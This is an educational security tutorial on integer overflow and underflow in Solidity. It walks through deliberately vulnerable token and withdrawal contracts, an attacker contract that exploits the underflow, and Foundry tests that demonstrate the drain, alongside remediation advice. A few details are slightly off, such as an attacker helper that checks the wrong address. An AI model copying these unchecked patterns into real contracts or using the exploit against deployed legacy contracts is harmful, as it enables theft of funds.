## 🧩 1. Introduction

Smart contract security has come a long way, but some of the oldest bugs in computing history still haunt modern decentralized applications — and integer overflow and underflow top that list. These seemingly simple arithmetic flaws have been responsible for millions of dollars in stolen funds, failed DeFi protocols, and broken game mechanics on Ethereum and other EVM-based chains.

This guide is your **complete, hands-on deep dive** into how integer overflows and underflows work at the **EVM level**, how they can be **exploited**, and how you can use tools like **Foundry** to recreate, understand, and defend against them.

### What This Guide Covers:
- A foundational understanding of overflow and underflow in Solidity  
- How arithmetic is handled internally by the EVM  
- The crucial differences between Solidity versions **pre-0.8.0** and **post-0.8.0**  
- Real-world vulnerable code snippets and how attackers exploit them  
- Writing PoCs (Proof of Concepts) with custom **attack contracts**  
- Hands-on walkthroughs using **Foundry-based testing**  
- Remediation techniques and **best practices** to stay secure

### Why It Still Matters Today:
While modern Solidity versions introduce safe arithmetic by default, many legacy contracts still run on earlier versions. Even today, developers sometimes disable safety checks using `unchecked` blocks or rely on low-level arithmetic for gas efficiency — creating new vulnerabilities in otherwise secure codebases.

### Why PoC-Based Learning?
Reading about vulnerabilities is one thing. Exploiting them yourself in a controlled environment is where the real understanding begins. This guide isn’t just theory — it's a **battle-tested lab** that will help you **think like an attacker**, understand real exploit paths, and **build better defenses**.

---

### 📌 TL;DR

Integer overflow and underflow are fundamental bugs that still impact smart contract security today — despite newer Solidity versions offering built-in protections.

This guide includes:
- 📘 Clear explanations of overflow/underflow  
- ⚙️ Deep dive into EVM arithmetic  
- 🧪 Real-world vulnerable examples  
- 🔓 Exploitation scenarios and attack contracts  
- 🧰 Foundry-based PoC development  
- 🛡️ Practical defense strategies  

Learn by doing. Break things. Fix them.  
**Understand security at the bytecode level.**


# 🧮 2. What Are Integer Overflow and Underflow?

## 📘 Conceptual Overview

In Solidity, integers have fixed sizes, such as `uint8`, `uint16`, up to `uint256`. These types represent **unsigned integers**, meaning they can only hold non-negative values — and each has a specific range.

For example:
- `uint8` can store values from 0 to 255.
- `uint256` can store values from 0 up to 2²⁵⁶ - 1 (a 78-digit number).

When an arithmetic operation causes the value to go **outside this range**, the number **wraps around** due to how binary math works in the EVM. This behavior is known as:

- **Overflow**: When the value exceeds the maximum (e.g., 255 + 1 = 0 in `uint8`).
- **Underflow**: When the value goes below the minimum (e.g., 0 - 1 = 255 in `uint8`).

---

## 🔁 Overflow Example

```solidity
pragma solidity ^0.7.6;

contract OverflowExample {
    uint8 public count = 255;

    function overflow() public {
        count += 1; // Wraps around to 0 (overflow)
    }
}
```

**Binary Explanation:**
- `255` is `11111111`
- Adding `1` results in `1_00000000` → overflows and becomes `00000000` (0)

---

## 🔁 Underflow Example

```solidity
pragma solidity ^0.7.6;

contract UnderflowExample {
    uint8 public count = 0;

    function underflow() public {
        count -= 1; // Wraps around to 255 (underflow)
    }
}
```

**Binary Explanation:**
- `0` is `00000000`
- Subtracting `1` results in `11111111`, or `255`

---

## 📉 Why It Matters

Prior to Solidity `0.8.0`, arithmetic in Solidity **did not include overflow or underflow checks** by default. This meant contracts could silently wrap values and introduce critical bugs or vulnerabilities without any error being thrown.

However, since Solidity version **0.8.0**, the compiler **automatically includes overflow and underflow checks**. Any operation that would overflow or underflow will now **revert** the transaction unless explicitly placed inside an `unchecked { ... }` block.

---

## 🧮 Visual Comparison

| Type     | Min Value | Max Value                             | Bit Size |
|----------|-----------|----------------------------------------|----------|
| `uint8`  | 0         | 255                                    | 8 bits   |
| `uint256`| 0         | 2^256 - 1 (very large)                 | 256 bits |

Even `uint256` — with its massive range — can overflow or underflow if operations are not properly checked.

---

## 🧪 Try It Yourself

To observe these behaviors:
- Use **Solidity < 0.8.0** in Remix or Foundry to see silent overflow/underflow in action.
- Use **Solidity >= 0.8.0** to see how the same operations revert the transaction by default.

We'll explore both behaviors hands-on using PoCs and Foundry in the next sections.

# 🔄 3. The Evolution: Pre-0.8.0 vs Post-0.8.0

Solidity has come a long way in how it handles arithmetic. Prior to version 0.8.0, developers had to manually guard against integer overflows and underflows. But with the release of Solidity 0.8.0, the language introduced **built-in overflow/underflow checks**, shifting the responsibility from the developer to the compiler.

---

## 🕰️ Pre-0.8.0: No Safety by Default

In versions prior to Solidity 0.8.0, **arithmetic was unchecked**. The compiler would translate operations like `+`, `-`, `*` directly into EVM opcodes (`ADD`, `SUB`, `MUL`) without checking if the result was valid in the context of the data type.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

contract LegacyMath {
    uint8 public value = 255;

    function overflow() public {
        value += 1; // wraps around to 0 (no error)
    }
}
```

---

## 🛡️ The Role of SafeMath (Before 0.8.0)

To mitigate this, libraries like **OpenZeppelin’s SafeMath** became essential.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "@openzeppelin/contracts/math/SafeMath.sol";

contract SafeAddition {
    using SafeMath for uint256;
    uint256 public total;

    function add(uint256 x) public {
        total = total.add(x); // reverts on overflow
    }
}
```

SafeMath’s implementation:
```solidity
function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");
    return c;
}
```

---

## 🚧 Post-0.8.0: Built-in Arithmetic Checks

Solidity 0.8.0 introduced **automatic checked arithmetic**.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SafeByDefault {
    uint8 public value = 255;

    function overflow() public {
        value += 1; // reverts automatically on overflow
    }
}
```

Unchecked behavior is opt-in:

```solidity
function unsafe() public {
    unchecked {
        value += 1; // wraps silently
    }
}
```

---

## 🧬 Bytecode Difference: Pre vs Post

### Pre-0.8.0:
- `+` → `ADD`
- Lightweight, unsafe

### Post-0.8.0:
- `+` → `ADD` + overflow check (e.g., `GT`, `ISZERO`, `REVERT`)

### Disassembly Tools:
```bash
solc LegacyMath.sol --bin
solc SafeByDefault.sol --bin
evm disasm bytecode.hex
```

Pre-0.8.0: `PUSH`, `ADD`, `SSTORE`

Post-0.8.0: `PUSH`, `ADD`, `GT`, `ISZERO`, `JUMPI`, `REVERT`, `SSTORE`

---

## 🔍 Summary

| Feature                         | Pre-0.8.0         | Post-0.8.0                |
|---------------------------------|-------------------|----------------------------|
| Arithmetic safety               | ❌ No             | ✅ Yes (by default)        |
| Overflow/underflow reverts      | ❌ No             | ✅ Yes                     |
| Need for SafeMath               | ✅ Required       | ❌ Not needed              |
| Unchecked arithmetic            | Always            | Only inside `unchecked {}`|
| Bytecode injected checks        | ❌ None           | ✅ Present                 |


# 🧪 4. Vulnerable Code Examples (Real-World)

Let’s now examine **how integer overflow and underflow have caused critical vulnerabilities** in live smart contracts, CTF challenges, and major discussions across the Ethereum security ecosystem.

This section focuses on:
- Ethernaut (by OpenZeppelin)
- SWC Registry (SWC-101)
- SafeMath deprecation discussion
- Public underflow-based CTF exploit

---

## 🎮 1. Ethernaut – Level 1: Fallback

In the [Ethernaut game](https://ethernaut.openzeppelin.com/), Level 1 (*Fallback*) includes this snippet:

```solidity
function withdraw() public {
    require(contributions[msg.sender] > 0);
    msg.sender.transfer(address(this).balance);
}
```

While not an overflow bug directly, it complements underflow-style abuse by combining **insecure authorization** with **maliciously crafted values**.

🧠 *Lesson:* Even basic arithmetic-based mappings (like `contributions[msg.sender] += msg.value`) are vulnerable when improperly guarded — especially pre-0.8.0.

---

## 📚 2. SWC-101 — Integer Overflow and Underflow

The [Smart Contract Weakness Classification (SWC)](https://swcregistry.io/docs/SWC-101) provides a canonical vulnerability pattern under **SWC-101**:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract OverflowChallenge {
    mapping(address => uint256) public balances;

    function withdraw(uint256 amount) public {
        balances[msg.sender] -= amount;
        msg.sender.transfer(amount);
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }
}
```

### 🔥 The Bug:
If the attacker **never deposited anything**, `balances[msg.sender]` is 0. When calling:

```solidity
withdraw(1 ether);
```

Then:
```solidity
balances[msg.sender] -= amount;
```
becomes:
```solidity
0 - 1 ether => underflows to MAX_UINT (2²⁵⁶ - 1)
```

This **sets the attacker's balance to nearly infinite**, then transfers ether to them — fully draining the contract if it has sufficient balance.

---

### 🧠 Exploit Flow:
1. Attacker **calls `withdraw(1 ether)` without depositing**.
2. Underflow occurs in `balances[msg.sender] -= amount;`
3. Their balance becomes `2^256 - 1`.
4. Funds are transferred without ever having deposited.

🛡️ *Fixed in Solidity 0.8.0 and above, which reverts this automatically.*

---

## 💬 3. SafeMath Deprecation (OpenZeppelin)

With the introduction of built-in overflow protection in Solidity 0.8.0, OpenZeppelin officially deprecated `SafeMath`:

> "Starting with Solidity 0.8, overflow checks are built-in, so SafeMath is no longer needed."

Source: [OpenZeppelin changelog](https://github.com/OpenZeppelin/openzeppelin-contracts/releases/tag/v4.0.0)

However, some legacy projects **continue using SafeMath unnecessarily**, bloating gas costs without benefit.

💡 *Takeaway:*  
- Remove `SafeMath` from modern contracts (`^0.8.0`)  
- Use `unchecked {}` only when performance is **critical** and **safe**

---

## 🎯 4. Public CTF/Exploit Pattern (Underflow to Infinite Funds)

```solidity
mapping(address => uint256) public balances;

function withdraw(uint amount) public {
    balances[msg.sender] -= amount;
    payable(msg.sender).transfer(amount);
}
```

### 🛠️ Exploitation

An attacker can:

1. Deploy a malicious contract
2. **Call `withdraw(10 ether)` without any deposit**
3. Underflow occurs: balance becomes `2^256 - 10 ether`
4. Attacker receives `10 ether` from the contract

> This was a **common exploit vector** in several pre-2021 vulnerable DeFi contracts, especially forks or untested deployments.

---

## 📉 The Impact

- Contracts were **drained** in minutes.
- Simple underflows gave attackers **unlimited tokens, voting power, or ETH**.
- If you find `balances[msg.sender] -= ...` in a pre-0.8.0 contract, it's a red flag.

---

## 🔐 Summary

| Source                       | Bug Type       | Impact                          |
|-----------------------------|----------------|----------------------------------|
| Ethernaut Fallback          | Mapping logic  | Ownership takeover              |
| SWC-101                     | Underflow      | Infinite withdrawal             |
| SafeMath deprecation        | N/A            | Misuse in modern contracts      |
| Public CTF / DeFi clones    | Underflow      | Contract drained via withdraw() |


# 💀 5. Writing Attack Contracts (PoCs)

Understanding vulnerabilities is only part of the equation — the **real power lies in simulating and exploiting them**. In this section, we’ll build **attack contracts** to simulate integer overflow and underflow bugs.

You’ll learn how to:
- Write minimal contracts that are vulnerable
- Build PoC attack contracts that exploit them
- Log state before and after
- Use Foundry cheatcodes (e.g., `vm.expectRevert()`)

---

## 🎯 Objective

Let’s simulate an underflow vulnerability in a simple token-like contract and write a PoC that exploits it.

---

## 📦 Vulnerable Contract (Pre-0.8.0)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract VulnerableToken {
    mapping(address => uint256) public balances;

    constructor() public {
        balances[msg.sender] = 100;
    }

    function transfer(address to, uint256 amount) public {
        balances[msg.sender] -= amount;
        balances[to] += amount;
    }
}
```

🧠 **Why is this vulnerable?**  
If `msg.sender` has a balance of 0 and calls `transfer()`, `balances[msg.sender] -= amount;` underflows and wraps to `2^256 - amount`.

---

## ⚔️ Exploit Contract (PoC)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IVulnerableToken {
    function transfer(address to, uint256 amount) external;
    function balances(address user) external view returns (uint256);
}

contract OverflowAttacker {
    IVulnerableToken public target;

    constructor(address _target) public {
        target = IVulnerableToken(_target);
    }

    function attack() public {
        target.transfer(msg.sender, 1 ether); // attacker has 0 balance initially
    }

    function getBalance() public view returns (uint256) {
        return target.balances(msg.sender);
    }
}
```

### 🧪 Before/After Logs

You can call `getBalance()` before and after the `attack()` to observe the overflow.

---

## 🧬 Foundry-Based PoC

If you're using [Foundry](https://book.getfoundry.sh/), here’s how to write a test:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;
import "forge-std/Test.sol";

import "../src/VulnerableToken.sol";
import "../src/OverflowAttacker.sol";

contract OverflowTest is Test {
    VulnerableToken token;
    OverflowAttacker attacker;

    function setUp() public {
        token = new VulnerableToken();
        attacker = new OverflowAttacker(address(token));
    }

    function testUnderflowAttack() public {
        // Initially attacker has 0 balance
        uint256 balanceBefore = token.balances(address(attacker));
        console.log("Before attack: %s", balanceBefore);

        attacker.attack();

        uint256 balanceAfter = token.balances(address(attacker));
        console.log("After attack: %s", balanceAfter);

        assertGt(balanceAfter, balanceBefore);
    }
}
```

---

### 🧪 Extra: Using `vm.expectRevert()` in Solidity ≥0.8

For post-0.8.0 contracts that have built-in overflow checks, test failure expectations:

```solidity
function testRevertOnOverflow() public {
    token = new SafeToken(); // written in Solidity ^0.8.0

    vm.expectRevert();
    token.transfer(address(1), 1 ether); // should revert
}
```

---

## ✅ Summary

| Step               | Description                              |
|--------------------|------------------------------------------|
| Write vuln logic   | Pre-0.8.0 arithmetic without checks       |
| Build attacker     | Interface + exploit function              |
| Log state          | Use `console.log` or `view` functions     |
| Automate in Foundry| Write tests to simulate full attack       |
| Cheatcodes         | Use `vm.expectRevert` to test protection  |
